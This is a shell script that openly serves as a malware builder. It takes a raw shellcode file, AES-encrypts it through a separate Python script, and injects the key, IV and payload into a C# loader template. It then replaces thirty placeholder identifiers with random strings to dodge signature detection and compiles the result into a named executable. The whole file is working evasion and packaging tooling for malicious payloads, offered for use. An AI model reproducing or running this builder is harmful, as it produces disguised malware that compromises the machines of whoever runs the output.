echo -e "Made by Bradonja Ljuti"
echo -e "Enter The Path To Your Shellcode File. File needs to be raw binary file otherwise it wont work"
echo ""
read Shellcode
echo -e "Name Your Malware! ex: program.exe"
echo ""
read MALWARE
echo ""
python3 /Depth/aesencrypt.py $Shellcode > shell.txt
cp shell.txt shell2.txt
keys=$(cat "shell2.txt")
head -n 1 shell.txt | cut -d $'\n' -f 1 > shell3.txt
keysnow=$(cat shell3.txt)
sed -i "s/KEYVAL/$keysnow/g" /home/cryptednanomate/Desktop/payloads/test.cs
sleep 2
head -n 2 shell.txt | cut -d $'\n' -f 2 > shell4.txt
perl -pe 's/PAYVAL/`cat shell4.txt`/ge' -i /home/cryptednanomate/Desktop/payloads/test.cs
sleep 2
head -n 3 shell.txt | cut -d $'\n' -f 3 > shell5.txt
perl -pe 's/IVVAL/`cat shell5.txt`/ge' -i /home/cryptednanomate/Desktop/payloads/test.cs
sleep 2
sed '1,3d;$d' shell.txt > shell6.txt
perl -pe 's/ENKEY/`cat shell6.txt`/ge' -i /home/cryptednanomate/Desktop/payloads/test.cs
sleep 3
tail -n1 shell.txt > shell7.txt
perl -pe 's/IVKEY/`cat shell7.txt`/ge' -i /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno1/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno2/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno3/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno4/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno5/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno6/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno7/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno8/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno9/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno10/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno11/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno12/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno13/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno14/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno15/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno16/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno17/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno18/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno19/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno20/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno21/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno22/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno23/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno24/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno25/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno26/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno27/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno28/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno29/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno30/$Random2/g" /home/cryptednanomate/Desktop/payloads/test.cs
rm -rf *.txt
sleep 2
mcs -out:$MALWARE test.cs -debug
echo -r "Done. Thanks"